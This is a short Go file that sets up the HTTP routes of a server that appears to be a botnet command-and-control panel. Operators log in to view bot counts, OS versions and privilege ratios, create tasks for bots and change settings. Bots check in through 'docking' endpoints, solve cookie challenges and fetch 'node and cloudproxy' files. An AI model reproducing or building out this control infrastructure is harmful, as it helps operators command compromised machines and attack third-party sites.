package server

import (
	"github.com/gin-gonic/gin"
	cAuth "wyvern.pw/controllers/auth"
	cBot "wyvern.pw/controllers/bot"
	cSetting "wyvern.pw/controllers/setting"
	cStatus "wyvern.pw/controllers/status"
	cTask "wyvern.pw/controllers/task"
	mAuth "wyvern.pw/middlewares/auth"
	mBot "wyvern.pw/middlewares/bot"
)

func getRouter() *gin.Engine {
	router := gin.New()
	router.Use(gin.Recovery())
	router.Use(gin.Logger())
	router.Use(mAuth.CORSMiddleware)

	api := router.Group("/api")
	{
		user := api.Group("/user")
		{
			user.POST("/check", cAuth.Check) // check token
			user.POST("/login", cAuth.Login) // get token
		}

		status := api.Group("/status")
		{
			status.Use(mAuth.CheckUserToken)

			status.GET("/bot", cStatus.GetBotStatus)       // get os version, online/offline bot count, privilege ratio
			status.GET("/server", cStatus.GetServerStatus) // get resource usage, summary
			status.GET("/bot/list", cStatus.GetBotList)    // get bot list
		}

		task := api.Group("/task")
		{
			task.Use(mAuth.CheckUserToken)

			task.POST("/create", cTask.CreateTask) // create new task
			task.GET("/history", cTask.GetHistory) // get old tasks
		}

		setting := api.Group("/setting")
		{
			setting.Use(mAuth.CheckUserToken)

			setting.POST("/update", cSetting.UpdateSetting) // update setting
		}

		docking := api.Group("/docking")
		{
			docking.Use(mBot.CheckBot)

			docking.POST("/knock", cBot.ParseKnock)     // default knock
			docking.POST("/solve", cBot.SolveChallenge) // solve cookie
			docking.GET("/stuff")                       // serve node and cloudproxy files
		}
	}

	return router
}
